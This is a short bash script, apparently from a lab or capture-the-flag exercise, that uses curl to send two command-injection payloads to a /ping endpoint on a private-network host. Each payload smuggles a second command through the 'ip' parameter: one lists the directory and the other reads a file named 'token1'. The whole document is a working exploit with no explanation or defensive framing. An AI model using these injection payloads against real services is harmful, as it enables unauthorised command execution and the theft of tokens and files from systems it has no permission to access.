#!/bin/bash

IP=10.5.5.101
PORT=8080
PAYLOAD1="127.0.0.1 -c 1 > /dev/null; ls; #"
PAYLOAD2="127.0.0.1 -c 1 > /dev/null; cat token1; #"

curl --get \
  --data-urlencode "ip=$PAYLOAD1" \
  $IP:$PORT/ping

curl --get \
  --data-urlencode "ip=$PAYLOAD2" \
  $IP:$PORT/ping
